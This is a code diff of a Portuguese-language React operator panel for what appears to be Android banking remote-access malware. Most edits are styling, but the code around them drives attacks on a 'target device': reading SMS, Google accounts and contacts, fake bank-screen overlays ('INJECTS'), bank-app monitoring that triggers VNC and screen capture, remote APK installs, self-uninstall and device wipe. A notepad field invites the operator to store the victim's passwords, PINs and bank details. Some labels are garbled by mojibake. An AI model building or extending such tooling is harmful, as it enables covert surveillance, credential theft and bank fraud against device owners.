-                  className="w-full py-2 bg-gradient-to-r from-amber-600/25 via-yellow-600/25 to-orange-500/25 border border-amber-400/50 hover:border-amber-300 text-amber-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(245,158,11,0.2)] cursor-pointer"
+                  className="w-full py-2 bg-gradient-to-r from-amber-600/25 via-yellow-600/25 to-[#ef4444]/25 border border-amber-400/50 hover:border-amber-300 text-amber-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(245,158,11,0.2)] cursor-pointer"
                 >
-                  <Mail className="w-4 h-4 text-amber-400" /> 📧 VER CONTAS GOOGLE
+                  <Mail className="w-4 h-4 text-amber-400" />  VER CONTAS GOOGLE
                 </EditableButton>
 
                 <EditableButton
@@ -4999,9 +5063,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-send-sms']}
                   onStyleChange={(style) => updateButtonStyle('btn-send-sms', style)}
-                  className="w-full py-2 bg-gradient-to-r from-blue-600/25 via-indigo-600/25 to-purple-600/25 border border-blue-400/50 hover:border-blue-300 text-blue-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)] cursor-pointer"
+                  className="w-full py-2 bg-gradient-to-r from-[#ef4444]/25 via-[#ef4444]/25 to-[#84cc16]/25 border border-[#3a3a44]/50 hover:border-[#4a4a56] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)] cursor-pointer"
                 >
-                  <MessageSquare className="w-4 h-4 text-blue-400" /> 💬 ENVIAR / LER SMS
+                  <MessageSquare className="w-4 h-4 text-[#ef4444]" />  ENVIAR / LER SMS
                 </EditableButton>
 
                 <EditableButton
@@ -5013,9 +5077,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-view-contacts']}
                   onStyleChange={(style) => updateButtonStyle('btn-view-contacts', style)}
-                  className="w-full py-2 bg-gradient-to-r from-amber-600/25 via-orange-600/25 to-yellow-600/25 border border-amber-400/50 hover:border-amber-300 text-amber-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(245,158,11,0.2)] cursor-pointer"
+                  className="w-full py-2 bg-gradient-to-r from-amber-600/25 via-[#84cc16]/25 to-yellow-600/25 border border-amber-400/50 hover:border-amber-300 text-amber-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(245,158,11,0.2)] cursor-pointer"
                 >
-                  <Users className="w-4 h-4 text-amber-400" /> 👥 VER CONTATOS
+                  <Users className="w-4 h-4 text-amber-400" />  VER CONTATOS
                 </EditableButton>
                 
                 <EditableButton
@@ -5024,9 +5088,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-install-apk']}
                   onStyleChange={(style) => updateButtonStyle('btn-install-apk', style)}
-                  className="w-full py-2 bg-gradient-to-r from-orange-600/20 to-amber-600/20 border border-orange-500/40 hover:border-orange-400 text-orange-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
+                  className="w-full py-2 bg-gradient-to-r from-[#84cc16]/20 to-amber-600/20 border border-[#ef4444]/40 hover:border-[#f87171] text-[#fca5a5] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                 >
-                  <Package className="w-4 h-4 text-orange-400" /> {t('panel.install_new_apk')}
+                  <Package className="w-4 h-4 text-[#f87171]" /> {t('panel.install_new_apk')}
                 </EditableButton>
                 
                 <div id="tour-fake-injects" className="w-full">
@@ -5036,9 +5100,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     isEditMode={isLayoutEditMode}
                     customStyle={layoutPrefs.buttonStyles['btn-injection']}
                     onStyleChange={(style) => updateButtonStyle('btn-injection', style)}
-                    className="w-full py-2 bg-gradient-to-r from-cyan-600/25 via-blue-600/25 to-sky-500/25 border border-cyan-400/50 hover:border-cyan-300 text-cyan-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)]"
+                    className="w-full py-2 bg-gradient-to-r from-[#ef4444]/25 via-[#ef4444]/25 to-[#ef4444]/25 border border-[#3a3a44]/50 hover:border-[#4a4a56] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)]"
                   >
-                    <Syringe className="w-4 h-4 text-cyan-400" /> {t('panel.fake_screen_injection')}
+                    <Syringe className="w-4 h-4 text-[#ef4444]" /> {t('panel.fake_screen_injection')}
                   </EditableButton>
                 </div>
 
@@ -5048,7 +5112,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-custom-captures']}
                   onStyleChange={(style) => updateButtonStyle('btn-custom-captures', style)}
-                  className="w-full py-2 bg-gradient-to-r from-teal-600/20 to-emerald-600/20 border border-teal-500/40 hover:border-teal-300 text-teal-300 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
+                  className="w-full py-2 bg-gradient-to-r from-teal-600/20 to-emerald-600/20 border border-teal-500/40 hover:border-teal-300 text-teal-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                 >
                   <Download className="w-4 h-4 text-teal-400" /> {t('panel.custom_captures')}
                 </EditableButton>
@@ -5056,10 +5120,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 <button
                   id="btn-self-destruct"
                   onClick={handleSelfDestruct}
-                  className="w-full py-2 bg-gradient-to-r from-red-950/40 to-rose-900/30 border border-red-500/40 hover:border-red-400 text-red-400 rounded-xl font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
+                  className="w-full py-2 bg-gradient-to-r from-[#121214]/40 to-[#1a1a1e]/30 border border-[#2a2a31]/40 hover:border-[#3a3a44] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                   title="Desinstala o app do aparelho"
                 >
-                  <ShieldAlert className="w-4 h-4 text-red-400" /> {t('panel.self_destruct')}
+                  <ShieldAlert className="w-4 h-4 text-[#ef4444]" /> {t('panel.self_destruct')}
                 </button>
 
                 <EditableButton
@@ -5068,24 +5132,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   isEditMode={isLayoutEditMode}
                   customStyle={layoutPrefs.buttonStyles['btn-format-device']}
                   onStyleChange={(style) => updateButtonStyle('btn-format-device', style)}
-                  className="w-full py-1.5 bg-[#140608] border border-red-900/60 hover:border-red-600 text-red-500/80 hover:text-red-400 rounded-xl font-bold uppercase tracking-wider text-[10px] transition-all flex items-center justify-center gap-1.5"
+                  className="w-full py-1.5 bg-[#0a0a0b] border border-[#1a1a1e]/60 hover:border-[#3a3a44] text-[#ef4444]/80 hover:text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-[10px] transition-all flex items-center justify-center gap-1.5"
                 >
                   š  {t('panel.wipe_device')}
                 </EditableButton>
               </div>
             </div>
 
-            {/* “ CARD 4: BLOCO DE NOTAS DE SENHAS & ANOTA‡•ES */}
-            <div className="bg-[#2c0903]/85 border border-cyan-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] backdrop-blur-xl rounded-2xl p-4 transition-all hover:border-cyan-400/50 relative overflow-hidden">
-              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent"></div>
+            {/*  CARD 4: BLOCO DE NOTAS DE SENHAS & ANOTAES */}
+            <div className="bg-[#2c0903]/85 border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] backdrop-blur-xl rounded-md p-4 transition-all hover:border-[#3a3a44]/50 relative overflow-hidden">
+              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
               
               <div className="flex items-center justify-between mb-2.5">
-                <h3 className="text-cyan-300 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
-                  <FileText className="w-4 h-4 text-cyan-400 animate-pulse" />
-                  “ BLOCO DE NOTAS / SENHAS
+                <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
+                  <FileText className="w-4 h-4 text-[#ef4444] animate-pulse" />
+                   BLOCO DE NOTAS / SENHAS
                 </h3>
                 <span className="text-[9px] font-mono font-bold text-emerald-400 bg-emerald-950/40 border border-emerald-500/30 px-2 py-0.5 rounded-full">
-                  💾 Salvo Auto
+                   Salvo Auto
                 </span>
               </div>
 
@@ -5095,17 +5159,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   onChange={(e) => handleNotesChange(e.target.value)}
                   placeholder="Escreva senhas, PINs, contas bancárias, dados do alvo ou anotações rápidas..."
                   rows={4}
-                  className="w-full px-3 py-2.5 bg-[#190503]/90 border border-cyan-500/30 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/40 text-xs font-mono transition-all resize-none shadow-inner custom-scrollbar"
+                  className="w-full px-3 py-2.5 bg-[#190503]/90 border border-[#2a2a31]/30 rounded-md text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 text-xs font-mono transition-all resize-none shadow-inner custom-scrollbar"
                 />
 
                 <div className="flex items-center gap-2">
                   <button
                     onClick={() => {
                       navigator.clipboard.writeText(deviceNotes);
-                      addLog('📋 Notas copiadas para a área de transferência!');
+                      addLog(' Notas copiadas para a área de transferência!');
                     }}
                     disabled={!deviceNotes.trim()}
-                    className="flex-1 py-1.5 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-blue-500 disabled:from-slate-800 disabled:to-slate-850 disabled:text-slate-600 text-white rounded-xl font-bold uppercase tracking-wider text-[10px] font-mono transition-all flex items-center justify-center gap-1 shadow-md cursor-pointer"
+                    className="flex-1 py-1.5 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:from-[#24242a] disabled:to-slate-850 disabled:text-[#6f6f78] text-[#10120a] rounded-md font-bold uppercase tracking-wider text-[10px] font-mono transition-all flex items-center justify-center gap-1 shadow-md cursor-pointer"
                   >
                     <Copy className="w-3 h-3" /> Copiar
                   </button>
@@ -5114,11 +5178,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     onClick={() => {
                       if (confirm('Deseja limpar as anotações deste dispositivo?')) {
                         handleNotesChange('');
-                        addLog('—‘ Bloco de notas limpo!');
+                        addLog(' Bloco de notas limpo!');
                       }
                     }}
                     disabled={!deviceNotes.trim()}
-                    className="py-1.5 px-3 bg-red-950/40 border border-red-500/30 hover:border-red-400 hover:bg-red-900/40 disabled:border-slate-800 disabled:bg-slate-900 disabled:text-slate-600 text-red-400 rounded-xl font-bold uppercase tracking-wider text-[10px] font-mono transition-all flex items-center justify-center gap-1 cursor-pointer"
+                    className="py-1.5 px-3 bg-[#121214]/40 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#1a1a1e]/40 disabled:border-[#24242a] disabled:bg-[#121214] disabled:text-[#6f6f78] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-[10px] font-mono transition-all flex items-center justify-center gap-1 cursor-pointer"
                     title="Limpar bloco de notas"
                   >
                     <Trash2 className="w-3 h-3" /> Limpar
@@ -5131,16 +5195,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
           {/* ===== COLUNA CENTRAL: VNC Screen + Screen Reader V2 ===== */}
           <div id="device-viewer" className="space-y-2 order-1 lg:order-2 lg:col-span-2">
-            {/* 🚨 BANNER DE ALERTA DE ABERTURA DE APLICATIVO MONITORADO */}
+            {/*  BANNER DE ALERTA DE ABERTURA DE APLICATIVO MONITORADO */}
             {activeAppAlert && (
-              <div className="bg-gradient-to-r from-red-600 via-amber-600 to-red-700 text-white p-3 rounded-2xl shadow-[0_0_30px_rgba(239,68,68,0.6)] border border-red-400 flex items-center justify-between animate-pulse mb-2 z-50">
+              <div className="bg-gradient-to-r from-[#ef4444] via-amber-600 to-[#ef4444] text-[#10120a] p-3 rounded-md shadow-[0_0_30px_rgba(239,68,68,0.6)] border border-[#3a3a44] flex items-center justify-between animate-pulse mb-2 z-50">
                 <div className="flex items-center space-x-3">
-                  <div className="p-2 bg-black/40 rounded-xl border border-red-300">
+                  <div className="p-2 bg-black/40 rounded-md border border-[#4a4a56]">
                     <Bell className="w-6 h-6 text-yellow-300 animate-bounce" />
                   </div>
                   <div>
                     <h4 className="text-sm font-black uppercase tracking-wider font-mono flex items-center gap-2">
-                      🚨 APLICATIVO MONITORADO ABERTO NO DISPOSITIVO ALVO!
+                       APLICATIVO MONITORADO ABERTO NO DISPOSITIVO ALVO!
                     </h4>
                     <p className="text-xs font-bold text-amber-200 mt-0.5">
                       App Detectado: <span className="text-white font-mono bg-black/60 px-2 py-0.5 rounded border border-amber-400/40">{activeAppAlert.appName} ({activeAppAlert.pkg})</span>
@@ -5155,13 +5219,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       if (!isScreenReaderEnabled) toggleScreenReader();
                       if (!isCaptureEnabled) toggleCapture();
                     }}
-                    className="px-3 py-1.5 bg-black/80 hover:bg-black text-cyan-300 border border-cyan-400 rounded-xl text-xs font-bold uppercase tracking-wider font-mono shadow-md transition-all cursor-pointer"
+                    className="px-3 py-1.5 bg-black/80 hover:bg-black text-[#ef4444] border border-[#3a3a44] rounded-md text-xs font-bold uppercase tracking-wider font-mono shadow-md transition-all cursor-pointer"
                   >
-                    📺 Abrir VNC + V2
+                     Abrir VNC + V2
                   </button>
                   <button
                     onClick={() => setActiveAppAlert(null)}
-                    className="p-1.5 text-white/80 hover:text-white bg-black/40 hover:bg-black/80 rounded-lg transition-all cursor-pointer"
+                    className="p-1.5 text-white/80 hover:text-white bg-black/40 hover:bg-black/80 rounded-md transition-all cursor-pointer"
                     title="Fechar Alerta"
                   >
                     <X className="w-5 h-5" />
@@ -5171,7 +5235,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             )}
 
             {/* Tabs para alternar entre VNC, Screen Reader V2, Lista de Apps, etc. (OTIMIZADO PARA TOUCH & CELULAR) */}
-            <div className="flex items-center overflow-x-auto no-scrollbar scroll-smooth whitespace-nowrap gap-1.5 bg-[#3d0c04]/90 backdrop-blur-xl p-2 rounded-2xl border border-cyan-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] text-xs touch-pan-x min-h-[48px]">
+            <div className="flex items-center overflow-x-auto no-scrollbar scroll-smooth whitespace-nowrap gap-1.5 bg-[#3d0c04]/90 backdrop-blur-xl p-2 rounded-md border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] text-xs touch-pan-x min-h-[48px]">
               <button
                 onClick={() => {
                   setShowBankMonitorTab(false);
@@ -5183,16 +5247,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowAppsTab(false);
                   setShowTouchTab(false);
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   !showBankMonitorTab && !showScreenReader && !showCombinedVncV2 && !showNotificationsTab && !showEditBankScreensTab && !showEditSystemScreensTab && !showAppsTab && !showTouchTab
-                    ? 'bg-gradient-to-r from-blue-600 to-cyan-500 text-white shadow-[0_0_15px_rgba(220,38,38,0.4)] border border-cyan-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
-                📺 {t('tabs.vnc_normal')}
+                 {t('tabs.vnc_normal')}
               </button>
               
-              {/* ⚡ NOVA ABA COMBINADA: VNC + V2 LADO A LADO */}
+              {/*  NOVA ABA COMBINADA: VNC + V2 LADO A LADO */}
               <button
                 onClick={() => {
                   setShowBankMonitorTab(false);
@@ -5206,15 +5270,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   if (!isScreenReaderEnabled) toggleScreenReader();
                   if (!isCaptureEnabled) toggleCapture();
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap flex items-center gap-1.5 ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                   showCombinedVncV2
-                    ? 'bg-gradient-to-r from-indigo-600 via-blue-600 to-cyan-500 text-white shadow-[0_0_20px_rgba(239,68,68,0.5)] border border-cyan-300/60 animate-pulse'
-                    : 'bg-slate-900/60 text-slate-300 hover:bg-slate-800/80 hover:text-white border border-slate-700'
+                    ? 'bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_20px_rgba(239,68,68,0.5)] border border-[#4a4a56]/60 animate-pulse'
+                    : 'bg-[#121214]/60 text-slate-300 hover:bg-[#24242a]/80 hover:text-white border border-[#2a2a31]'
                 }`}
               >
-                <span className="text-amber-400">⚡</span>
+                <span className="text-amber-400"></span>
                 <span>VNC + V2 (Dividido)</span>
-                <span className="px-1.5 py-0.5 text-[8px] font-black uppercase bg-cyan-500/30 text-cyan-200 rounded-md border border-cyan-400/40">NOVO</span>
+                <span className="px-1.5 py-0.5 text-[8px] font-black uppercase bg-[#ef4444]/30 text-[#e8e8ea] rounded-md border border-[#3a3a44]/40">NOVO</span>
               </button>
 
               <button
@@ -5229,14 +5293,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowTouchTab(false);
                   if (!isScreenReaderEnabled) toggleScreenReader();
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   !showBankMonitorTab && showScreenReader && !showCombinedVncV2 && !showNotificationsTab && !showEditBankScreensTab && !showEditSystemScreensTab && !showAppsTab && !showTouchTab
-                    ? 'bg-gradient-to-r from-cyan-600 to-teal-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-cyan-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#ef4444] to-teal-500 text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
-                <Eye className="w-3.5 h-3.5 inline mr-1 text-cyan-400 animate-pulse" />
-                V2 {isScreenReaderEnabled && '✅'}
+                <Eye className="w-3.5 h-3.5 inline mr-1 text-[#ef4444] animate-pulse" />
+                V2 {isScreenReaderEnabled && ''}
               </button>
               <button
                 onClick={() => {
@@ -5248,13 +5312,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowAppsTab(false);
                   setShowTouchTab(true);
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   showTouchTab
-                    ? 'bg-gradient-to-r from-amber-500 via-orange-600 to-yellow-500 text-white shadow-[0_0_18px_rgba(245,158,11,0.45)] border border-amber-300/50'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-amber-500 via-[#84cc16] to-yellow-500 text-white shadow-[0_0_18px_rgba(245,158,11,0.45)] border border-amber-300/50'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
-                🎯 Visualizador de Toques
+                 Visualizador de Toques
               </button>
               <button
                 onClick={() => {
@@ -5266,10 +5330,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowAppsTab(true);
                   fetchInstalledApps();
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   showAppsTab
                     ? 'bg-gradient-to-r from-emerald-600 to-teal-500 text-white shadow-[0_0_15px_rgba(16,185,129,0.4)] border border-emerald-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
                 <Smartphone className="w-3.5 h-3.5 inline mr-1 text-emerald-400" />
@@ -5284,10 +5348,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowEditSystemScreensTab(false);
                   setShowAppsTab(false);
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   showBankMonitorTab && !showEditBankScreensTab && !showEditSystemScreensTab
-                    ? 'bg-gradient-to-r from-orange-600 to-red-500 text-white shadow-[0_0_15px_rgba(249,115,22,0.4)] border border-orange-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] text-white shadow-[0_0_15px_rgba(249,115,22,0.4)] border border-[#f87171]/40'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
                  {t('tabs.banks')} {installedBanks.length > 0 && `(${installedBanks.length})`}
@@ -5301,13 +5365,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowEditSystemScreensTab(false);
                   setShowAppsTab(false);
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   showNotificationsTab && !showEditBankScreensTab && !showEditSystemScreensTab
-                    ? 'bg-gradient-to-r from-purple-600 to-indigo-500 text-white shadow-[0_0_15px_rgba(220,38,38,0.4)] border border-purple-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] text-white shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-[#f87171]/40'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
-                <Bell className="w-3.5 h-3.5 inline mr-1 text-purple-400" />
+                <Bell className="w-3.5 h-3.5 inline mr-1 text-[#f87171]" />
                 {t('tabs.notifications')} {notifications.length > 0 && `(${notifications.length})`}
               </button>
               <button
@@ -5320,13 +5384,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowAppsTab(false);
                   selectPreset(selectedPresetScreenId);
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   showEditBankScreensTab
-                    ? 'bg-gradient-to-r from-pink-600 to-rose-500 text-white shadow-[0_0_15px_rgba(236,72,153,0.4)] border border-pink-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    ? 'bg-gradient-to-r from-[#65a30d] to-[#ef4444] text-white shadow-[0_0_15px_rgba(236,72,153,0.4)] border border-pink-400/40'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
-                💉 INJECTS
+                 INJECTS
               </button>
               <button
                 onClick={() => {
@@ -5338,30 +5402,30 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   setShowAppsTab(false);
                   selectSystemPreset(selectedSystemScreenId);
                 }}
-                className={`px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap ${
+                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                   showEditSystemScreensTab
                     ? 'bg-gradient-to-r from-teal-600 to-emerald-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-teal-400/40'
-                    : 'bg-slate-900/60 text-slate-400 hover:bg-slate-800/80 hover:text-white border border-slate-800'
+                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                 }`}
               >
-                🔒 Telas do Sistema
+                 Telas do Sistema
               </button>
               <button
                 onClick={() => setIsExpandedMode(true)}
-                className="px-3 py-2 rounded-xl font-bold transition-all whitespace-nowrap text-xs bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-500 hover:to-blue-500 text-white shadow-[0_0_10px_rgba(239,68,68,0.3)] border border-indigo-400/30"
+                className="px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap text-xs bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] shadow-[0_0_10px_rgba(239,68,68,0.3)] border border-[#3a3a44]/30"
                 title="Expandir VNC + V2 lado a lado"
               >
-                ⛶ Expandir
+                 Expandir
               </button>
             </div>
             
             {/* Conteúdo */}
             {showTouchTab ? (
-              <div className="bg-[#360b03]/90 border border-amber-500/40 rounded-2xl p-5 text-slate-200 shadow-2xl backdrop-blur-2xl flex flex-col" style={{ minHeight: '620px' }}>
+              <div className="bg-[#360b03]/90 border border-amber-500/40 rounded-md p-5 text-slate-200 shadow-2xl backdrop-blur-2xl flex flex-col" style={{ minHeight: '620px' }}>
                 <div className="flex items-center justify-between pb-4 border-b border-amber-500/20 mb-4">
                   <div className="flex items-center gap-3">
-                    <div className="p-2.5 rounded-xl bg-amber-500/20 border border-amber-400/40 text-amber-300 shadow-[0_0_15px_rgba(245,158,11,0.3)]">
-                      🎯
+                    <div className="p-2.5 rounded-md bg-amber-500/20 border border-amber-400/40 text-amber-300 shadow-[0_0_15px_rgba(245,158,11,0.3)]">
+                      
                     </div>
                     <div>
                       <h3 className="text-base font-black uppercase text-amber-300 font-mono tracking-wider">
@@ -5374,12 +5438,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   </div>
                   <div className="flex items-center gap-2">
                     <span className="px-3 py-1 bg-amber-500/15 border border-amber-400/40 text-amber-300 text-xs font-mono font-bold rounded-full animate-pulse">
-                      🔴 STREAM AO VIVO
+                       STREAM AO VIVO
                     </span>
                   </div>
                 </div>
 
-                <div className="flex-1 flex items-center justify-center bg-[#160303] rounded-2xl border border-amber-500/20 p-4 relative overflow-hidden shadow-inner">
+                <div className="flex-1 flex items-center justify-center bg-[#160303] rounded-md border border-amber-500/20 p-4 relative overflow-hidden shadow-inner">
                   <DeviceScreen
                     deviceId={deviceId!}
                     onCommand={sendCommand}
@@ -5390,9 +5454,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               </div>
             ) : showAppsTab ? (
-              <div className="bg-[#360b03]/90 border border-blue-500/30 rounded-2xl p-4 text-slate-200 overflow-hidden shadow-2xl backdrop-blur-2xl" style={{ minHeight: '620px' }}>
+              <div className="bg-[#360b03]/90 border border-[#2a2a31]/30 rounded-md p-4 text-slate-200 overflow-hidden shadow-2xl backdrop-blur-2xl" style={{ minHeight: '620px' }}>
                 {/* Header do Tab de Apps */}
-                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-blue-500/20">
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-[#2a2a31]/20">
                   <div className="flex items-center gap-2.5">
                     <Smartphone className="w-5 h-5 text-emerald-400" />
                     <div>
@@ -5403,7 +5467,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <button
                     onClick={() => fetchInstalledApps()}
                     disabled={isLoadingApps}
-                    className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.3)] transition-all flex items-center gap-1.5 self-start sm:self-auto"
+                    className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-md text-xs font-bold uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.3)] transition-all flex items-center gap-1.5 self-start sm:self-auto"
                   >
                     <RefreshCw className={`w-3.5 h-3.5 ${isLoadingApps ? 'animate-spin' : ''}`} />
                     {isLoadingApps ? 'Carregando...' : 'Atualizar Lista'}
@@ -5415,62 +5479,62 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <div className="flex items-center gap-1.5 w-full sm:w-auto overflow-x-auto text-xs">
                     <button
                       onClick={() => setAppsFilter('all')}
